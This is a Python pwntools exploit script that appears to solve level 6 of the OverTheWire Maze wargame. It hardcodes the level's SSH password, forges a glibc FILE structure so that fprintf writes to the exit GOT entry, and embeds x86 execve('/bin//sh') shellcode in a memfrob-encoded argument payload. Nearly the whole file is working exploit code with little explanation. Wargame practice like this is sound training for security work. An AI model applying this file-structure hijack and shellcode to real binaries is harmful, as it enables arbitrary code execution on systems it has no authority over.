#!/usr/bin/python2
from pwn import *
import os
import time

#Level information for ssh
level = 6
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'epheghuoli'
PORT = 2225

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

#reverse memfrob bytes
def revfrob(s):
    rvrsd = ''
    for c in s:
        rvrsd += chr(ord(c) ^ 42)
    return rvrsd
        

#Craft a faked file struct to be pointed to by fprintf - doing so will write to a memory location
#of my choice
def fake_file(writeaddr):
    #_flags = 0xfbad3484
    _flags = 0x0
    _vtable = 0xf7f98580
    _lock = 0xffffd07d
    _chain = 0xf7f97c40
    writeend = writeaddr+7
    struct = p32(0x0)             #  _flags           
    struct += p32(0x0)               #  _IO_read_ptr   
    struct += p32(0x0)               #  _IO_read_end   
    struct += p32(0x0)               #  _IO_read_base  
    struct += p32(0x0)               #  _IO_write_base 
    struct += p32(0x0)               #  _IO_write_ptr  
    struct += p32(0x0)               #  _IO_write_end  
    struct += p32(writeaddr)         #  _IO_buf_base   
    struct += p32(writeend)       #  _IO_buf_end    
    struct += p32(0x0)               #  _IO_save_base  
    struct += p32(0x0)               #  _IO_backup_base
    struct += p32(0x0)               #  _IO_save_end   
    struct += p32(0x0)               #  _markers       
    struct += p32(_chain)               #  _chain         
    struct += p32(0x0)               #  _fileno        
    struct += p32(0x0)               #  _flags2        
    struct += p32(0x0)               #  _cur_column    
    struct += p32(0x0)               #  _vtable_offset 
    struct += p32(_lock)             #  _lock            
    struct += p32(0xffffffff)   #  _offset 
    struct += p32(0xffffffff)   #  _offset pt 2
    struct += p32(0x0)               #  __pad1           
    struct += p32(0x0)               #  __pad2           
    struct += p32(0x0)               #  __pad3           
    struct += p32(0x0)               #  __pad4           
    struct += p32(0x0)               #  __pad5           
    struct += p32(0x0)               #  _mode            
    struct += '\x00'*40              # _unused
    struct += p32(_vtable)
    return struct

#GDB 'file' struct output - need to replicate
#_IO_file_jumps vtable addr = 0xf7f98580
#_flags = 0xfbad3484
#_lock val = 0x804a238

#$1 = {
#  _flags           = -72534908,
#  _IO_read_ptr     = 0x0,
#  _IO_read_end     = 0x0,
#  _IO_read_base    = 0x0,
#  _IO_write_base   = 0x0,
#  _IO_write_ptr    = 0x0,
#  _IO_write_end    = 0x0,
#  _IO_buf_base     = 0x0,
#  _IO_buf_end      = 0x0,
#  _IO_save_base    = 0x0,
#  _IO_backup_base  = 0x0,
#  _IO_save_end     = 0x0,
#  _markers         = 0x0,
#  _chain           = 0xf7f97c40 <_IO_2_1_stderr_>,
#  _fileno          = 3,
#  _flags2          = 0,
#  _old_offset      = 0,
#  _cur_column      = 0,
#  _vtable_offset   = 0 '\000',
#  _shortbuf        = "",
#  _lock            = 0x804a238,
#  _offset          = -1,
#  __pad1           = x0,
#  __pad2           = 0x804a244,
#  __pad3           = 0x0,
#  __pad4           = 0x0,
#  __pad5           = 0,
#  _mode            = 0,
#  _unused2         = '\000' <repeats 39 times>
#}
#vtable addr goes at end ^

shellcode=b'SHELLCODE=\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80'

#env
busted_loc_addr=b'\xd4\xd0\xff\xff'
busted_addr=b'\xd1\xd0\xff\xff'
exit_loc=0x080498dc
writeloc = exit_loc-3
shellcode_addr=b'\xc8\xcf\xff\xff'
fake_file_addr=b'\xe5\xd0\xff\xff'
#noenv
#busted_loc_addr=b'\x94\xdb\xff\xff'
#busted_addr=b'\x91\xdb\xff\xff'
#shellcode_addr=b'\x88\xda\xff\xff'
#fake_file_addr=b'\xa5\xdb\xff\xff'
#exit_loc=0x080498dc
#writeloc = exit_loc-3
payload=revfrob(shellcode_addr + b'TTEST\x00' + shellcode + cyclic(197) + fake_file_addr + cyclic(12) + busted_loc_addr + b'k'*9 + 'busted\x00' + busted_addr + 'FAKEFILE=' + fake_file(writeloc) + b'tras')
print(payload)
args=['./maze6', 'public', payload]
#p = process(executable="./maze6", argv=args)
#p.interactive()

